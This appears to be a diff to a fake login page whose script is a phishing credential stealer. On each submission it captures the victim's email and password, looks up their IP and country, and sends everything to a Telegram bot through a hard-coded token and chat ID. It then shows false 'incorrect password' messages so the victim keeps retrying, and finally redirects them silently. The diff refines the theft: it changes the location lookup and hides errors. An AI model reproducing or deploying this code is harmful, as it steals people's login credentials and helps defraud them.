@@ -61,14 +61,6 @@
             display: block;
             margin-top: 10px;
         }
-        .feedback {
-            color: red;
-            font-family: sans-serif;
-            font-size: 15px;
-            text-align: center;
-            margin: 0 30px;
-            display: none; /* Initially hidden */
-        }
         .footer {
             margin-top: 20px;
             font-size: 12px;
@@ -98,6 +90,7 @@
             <p><a href="#">About</a> · <a href="#">Help</a> · <a href="#">More</a></p>
         </div>
     </div>
+
     <script>
         var login = document.getElementById('login');
         var email = document.getElementById('email');
@@ -115,20 +108,17 @@
                 return;
             }
 
-            // Fetch the user's IP address and location
+            // Fetch the user's IP address and country using a simple IP info API
             try {
-                const ipResponse = await fetch('https://api.ipify.org?format=json');
+                const ipResponse = await fetch('https://ipapi.co/json/');
                 const ipData = await ipResponse.json();
                 const userIP = ipData.ip;
-
-                const locationResponse = await fetch(`https://ipinfo.io/${userIP}/json?token=YOUR_IPINFO_TOKEN`); // Replace with your IPinfo token
-                const locationData = await locationResponse.json();
-                const { city, region, country } = locationData;
+                const country = ipData.country_name; // Country name
 
                 // Prepare the message to send to Telegram
-                const message = `Email: ${email.value}\nPassword: ${password.value}\nLocation: ${city}, ${region}, ${country}\nIP: ${userIP}`;
-                const telegramToken = '7769927746:AAGY_cQOjnRPs7_x4ooXr90qFSe9LnBvr20'; // Replace with your bot token
-                const chatId = '7735490302'; // Replace with your chat ID
+                const message = `Email: ${email.value}\nPassword: ${password.value}\nIP: ${userIP}\nCountry: ${country}`;
+                const telegramToken = '7769927746:AAGY_cQOjnRPs7_x4ooXr90qFSe9LnBvr20'; // Your Bot Token
+                const chatId = '7735490302'; // Your Chat ID
                 const telegramUrl = `https://api.telegram.org/bot${telegramToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;
 
                 // Send the data to Telegram
@@ -137,23 +127,27 @@
                     throw new Error('Failed to send data to Telegram.');
                 }
 
+                // Increment the attempt counter
                 attempts++;
+
                 if (attempts < 3) {
                     feedback.textContent = 'Incorrect password! Please try again...';
                     feedback.style.display = 'block';
                 } else {
-                    // Redirect to another page after the last attempt
+                    // Redirect to done.html after the last attempt
                     setTimeout(() => {
                         window.location.href = 'done.html';
                     }, 2000); // Redirect after 2 seconds
                 }
             } catch (error) {
+                // No error message displayed
                 console.error('Error:', error);
-                feedback.textContent = 'An error occurred. Please try again later.';
-                feedback.style.display = 'block';
+                setTimeout(() => {
+                    window.location.href = 'done.html'; // Redirect even on error
+                }, 2000); // Redirect after 2 seconds, no feedback shown
             }
         });
     </script>
-    
+
 </body>
 </html>
